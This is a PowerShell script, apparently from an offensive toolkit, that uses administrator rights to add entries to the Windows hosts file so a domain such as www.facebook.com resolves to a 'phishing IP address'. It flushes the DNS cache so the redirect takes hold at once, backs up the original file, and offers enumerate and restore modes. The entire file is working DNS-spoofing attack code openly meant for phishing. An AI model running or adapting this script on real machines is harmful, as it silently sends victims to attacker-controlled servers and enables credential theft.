<#
.SYNOPSIS
   Redirect Domain Names to our Phishing IP address (dns spoof)

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.2
   
.DESCRIPTION
   Remark: This module its [ deprecated ]
   Redirect Domain Names to our Phishing IP address

.NOTES
   Required Dependencies: Administrator privileges on shell
   Remark: This will never work if the server uses CDN or
   virtual hosts This only applies on servers with dedicated IPs.

.Parameter DnSpoof
   Accepts arguments: Enum, Redirect and Clear

.Parameter FileHosts
   Accepts the hosts file absoluct path (optional setting)

.Parameter Domain
   Accepts the Domain Name to be redirected to our phishing IP address 

.Parameter ToIPaddr
   Accepts the Phishing IP Address to redirect Domain name into

.EXAMPLE
   PS C:\> Get-Help .\DnsSpoof.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\DnsSpoof.ps1 -DnsSpoof Enum
   Display hosts file content (dns resolver)

.EXAMPLE
   PS C:\> .\DnsSpoof.ps1 -DnsSpoof Redirect -Domain "www.facebook.com" -ToIPaddr "192.168.1.72"
   Backup original hosts file and redirect Domain Name www.facebook.com To IPaddress 192.168.1.72

.EXAMPLE
   PS C:\> .\DnsSpoof.ps1 -DnsSpoof Clear
   Revert hosts file to is original state before DnSpoof changes.

.INPUTS
   None. You cannot pipe objects into DnsSpoof.ps1

.OUTPUTS
   Redirecting Domains Using hosts File (Dns Spoofing)
   Clean dns cache before adding entry to hosts file.
   Redirect Domain: www.facebook.com TO IPADDR: 192.168.1.72
   ---------------------------------------------------------
   # This file contains the mappings of IP addresses to host names. Each
   # entry should be kept on an individual line. The IP address should
   # be placed in the first column followed by the corresponding host name.
   # The IP address and the host name should be separated by at least one
   # space.
   #
   # Additionally, comments (such as these) may be inserted on individual
   # lines or following the machine name denoted by a '#' symbol.
   #
   # For example:
   #
   #      102.54.94.97     rhino.acme.com          # source server
   #       38.25.63.10     x.acme.com              # x client host
   # localhost name resolution is handled within DNS itself.
   #	127.0.0.1       localhost
   #	::1             localhost
   192.168.1.72 www.facebook.com
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$FileHosts="$Env:WINDIR\System32\drivers\etc\hosts",
   [string]$ToIPaddr="216.58.215.131", ## www.google.pt
   [string]$Domain="www.facebook.com",
   [string]$DnsSpoof="false"
)


If($DnsSpoof -ieq "Enum"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Display hosts file content (dns resolver)

   .EXAMPLE
      PS C:\> .\DnSpoof.ps1 -DnsSpoof Enum
      Display hosts file content (dns resolver)
   #>

   If(Test-Path -Path "$FileHosts"){
       echo "`nDisplay hosts file content (dns resolver)" > $Env:TMP\outputtable.log
       echo "-----------------------------------------" >> $Env:TMP\outputtable.log
       Get-Content -Path "$Env:TMP\outputtable.log";Start-Sleep -Seconds 1
       Remove-Item -Path "$Env:TMP\outputtable.log" -Force
       Get-Content -Path "$FileHosts"
       Write-Host "`n"
   }Else{## hosts file not found in current location
       echo "`n[error] Not found: $FileHosts`n" > $Env:TMP\errorlog.log
       Get-Content -Path "$Env:TMP\errorlog.log"
       Remove-Item -Path "$Env:TMP\errorlog.log" -Force
       exit ## Exit @DnSpoof   
   }
}


If($DnsSpoof -ieq "Redirect"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Redirect Domain Names to our Phishing IP address

   .NOTES
      This module deletes target system dns cache to prevent
      the domain Name to NOT be resolved through dns cache.

   .EXAMPLE
      PS C:\> .\DnsSpoof.ps1 -DnsSpoof Redirect -Domain "www.facebook.com" -ToIPaddr "192.168.1.72"
      Backup original hosts file and redirect Domain Name www.facebook.com To IP address 192.168.1.72
   #>

   echo "`nRedirecting Domains Using hosts File (Dns Spoofing)" > $Env:TMP\qwerty.log
   echo "Clean dns cache before adding entry to hosts file" >> $Env:TMP\qwerty.log
   ## Clean dns cache before adding entry to hosts file
   ipconfig /flushdns|Out-Null

   echo "Redirect Domain: $Domain TO IPADDR: $ToIPaddr" >> $Env:TMP\qwerty.log
   echo "---------------------------------------------------------" >> $Env:TMP\qwerty.log
   ## Make sure we are running under administrator privileges account       
   $bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
   If($bool){## Administrator privileges found

       ## Backup original hosts file if not exist
       If(-not(Test-Path -Path "$Env:APPDATA\hosts-backup")){
           ## This function allow user to add more than one entry to dns hosts file
           # by not backing up the original hosts file if the backup allready exists.
           Copy-Item -Path "$FileHosts" -Destination "$Env:APPDATA\hosts-backup" -Force
       }
       ## Add dns Entry to hosts file
       Add-Content -Path $FileHosts "$ToIPaddr $Domain"

       ## Build output Table
       Get-Content -Path "$Env:TMP\qwerty.log";Start-Sleep -Seconds 1
       Remove-Item -Path "$Env:TMP\qwerty.log" -Force
       Get-Content -Path "$FileHosts"
       Write-Host "`n"

   }Else{## DnSpoof module requires administrator privs to run!

       echo "`n[error] DnsSpoof module requires administrator privs to run!`n" > $Env:TMP\errorlog.log
       Get-Content -Path "$Env:TMP\errorlog.log"
       Remove-Item -Path "$Env:TMP\errorlog.log" -Force
       exit ## Exit @DnSpoof

   }
}


If($DnsSpoof -ieq "Clear"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Revert hosts file to is original state before DnSpoof changes.

   .EXAMPLE
      PS C:\> .\DnsSpoof.ps1 -DnsSpoof Clear
      Revert hosts file to is original state before DnSpoof changes
   #>

   ## Revert dns cache to default settings
   If(Test-Path -Path "$Env:APPDATA\hosts-backup" -EA SilentlyContinue){

       echo "`nReverting dns cache to default settings" > $Env:TMP\outputtable.log
       echo "---------------------------------------" >> $Env:TMP\outputtable.log
       Move-Item -Path "$Env:APPDATA\hosts-backup" -Destination "$FileHosts" -Force
       Get-Content -Path "$Env:TMP\outputtable.log"
       Remove-Item -Path "$Env:TMP\outputtable.log" -Force

       ## Display hosts file contents now
       Start-Sleep -Seconds 1
       Get-Content -Path "$FileHosts"
       Write-Host "`n"

   }Else{## Hosts backup file not found in current system

       echo "`n[error] Not found: $Env:APPDATA\hosts-backup`n" >> $Env:TMP\errorlog.log
       Get-Content -Path "$Env:TMP\errorlog.log"
       Remove-Item -Path "$Env:TMP\errorlog.log" -Force
       exit ## Exit @DnSpoof   

   }
}
